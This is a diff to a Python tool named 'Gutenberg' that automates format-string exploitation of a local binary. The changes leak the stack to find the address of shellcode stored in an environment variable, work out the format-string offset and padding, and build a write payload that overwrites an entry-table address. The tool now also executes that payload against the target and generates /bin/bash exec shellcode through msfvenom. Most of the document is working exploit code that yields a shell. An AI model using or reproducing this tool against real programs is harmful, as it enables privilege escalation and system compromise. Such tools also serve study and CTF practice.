@@ -94,6 +94,7 @@ def exec_cmd_args(binary, cmd):
 def check(binary):
     if not access(binary, X_OK):
         print_silent("[-] Binary can't be executed")
+        print_silent("[-] Exiting")
         exit(1)
     else:
         print_silent("[+] Binary is executable")
@@ -102,59 +103,83 @@ def check(binary):
             mkfifo(FIFO)
     except OSError as oe:
         print_silent("[-] " + oe)
+        print_silent("[-] Exiting")
         exit(1)
     pass
 
 
-def analyze(binary):
-    chr_padd = 0
+def analyze(binary, environ):
+    what_to_write = 0
     for i in range(MAX_ITER):
+        r = exec_cmd(binary, "%{0:d}$s = %{0:d}$x".format(i))
+        if b'SHELLCODE=' == r[:10]:
+            what_to_write = int(r[-8:], 16) + 10
+            print_silent("[+] Address of SHELLCODE is 0x{:08x}".format(what_to_write))
+            break
+    if what_to_write == 0:
+        print_silent("[-] Can't find SHELLCODE offset")
+        print_silent("[-] Exiting")
+        exit(1)
+
+    chr_padd = 0
+    i = 0
+    while i < MAX_ITER:
         payload = generate_payload(0x41414141, i, fmt=FMT_CHECK, chr_padd=chr_padd)
         r = exec_cmd(binary, payload)
         if b'4141' in r:
             if r.split(b'-')[0][16:] != b'41414141':
-                i = 0
-                chr_padd += 1
+                if r.split(b'-')[1][8:] != b'41414141':
+                    i = 0
+                    chr_padd += 1
             else:
                 print_silent("[+] Offset is {:d} with padding of {:d}".format(i, chr_padd))
                 break
+        i += 1
 
+    if i == MAX_ITER - 1:
+        print_silent("[-] Can't find payload address in stack")
+        print_silent("[-] Exiting")
+        exit(1)
     where_to_write = detect_entries_table(binary)
-    if where_to_write == 0: # debug
-        print("[-] No entries to rewrite")
+    if where_to_write == 0:
+        print_silent("[-] No entries to rewrite")
+        print_silent("[-] Exiting")
         exit(1)
     else:
-        print_silent("[+] We need to write in 0x{:08x}".format(where_to_write))
-    return generate_payload(where_to_write, i, fmt=FMT_WRITE, chr_padd=chr_padd)
+        print_silent("[+] Writing address 0x{:08x}".format(where_to_write))
+
+    return generate_payload(where_to_write, i, what_to_write, FMT_WRITE, chr_padd)
 
 
 def exploit(binary, payload):
     print_silent("[+] Payload ", end='')
     print(payload)
+    r = exec_cmd(binary, payload)
     pass
 
 
 def generate_shellcode():
-    shellcode = run(["msfvenom", cmd], stdout=PIPE)
-    print(shellcode)
-    return shellcode
+    shellcode = run(["msfvenom", "-p", "linux/x64/exec", "CMD='/bin/bash'", "-b", "'\\0'"], stdout=PIPE, stderr=PIPE).stdout
+    return str(shellcode)
 
 
 def main():
     parser = ArgumentParser(description = "Detect and analyse format string exploit")
     parser.add_argument("binary", metavar="binary", help="The binary to analyse")
-    parser.add_argument("method", choices=["args", "stdin"], help="Use specific method") 
+    parser.add_argument("method", choices=["args", "stdin"], help="Use specific method")
+    parser.add_argument("-e", "--environ", default="SHELLCODE", help="Environement variable name, define it if you already uploaded a shellcode")
+    parser.add_argument("-i", "--iter", default="1000", help="Number of iteration on stack")
     parser.add_argument("-s", "--silent", action="store_false", help="Only print final payload")
     parser.add_argument("-v", "--version", action="store_true", help="Print version number")
-    parser.add_argument("-e", "--environ", default="SHELLCODE", help="Print version number")
     args = parser.parse_args()
 
     if (args.version):
         print_silent("[+] Gutenberg {}.{}.{}".format(gutenbreg_major, gutenbreg_minor, gutenbreg_bug))
         print_silent("[+] Made by the Rapace Diabolique\n")
 
-    global silent, exec_cmd
+    global silent, exec_cmd, MAX_ITER
     silent = args.silent
+    MAX_ITER = int(args.iter)
     exec_cmd = exec_cmd_args if args.method == "args" else exec_cmd_stdin
 
     signal(SIGINT, signal_handler)
@@ -164,7 +189,7 @@ def main():
     print_silent("[+] Checking file")
     check(args.binary)
     print_silent("[+] Analyzing file")
-    payload = analyze(args.binary)
+    payload = analyze(args.binary, args.environ)
     print_silent("[+] Running exploit")
     exploit(args.binary, payload)
     print_silent("[+] Exiting")
@@ -172,6 +197,7 @@ def main():
 
 def signal_handler(signal, frame):
     print_silent("[-] Search cancelled")
+    print_silent("[-] Exiting")
     exit(0)
 
 
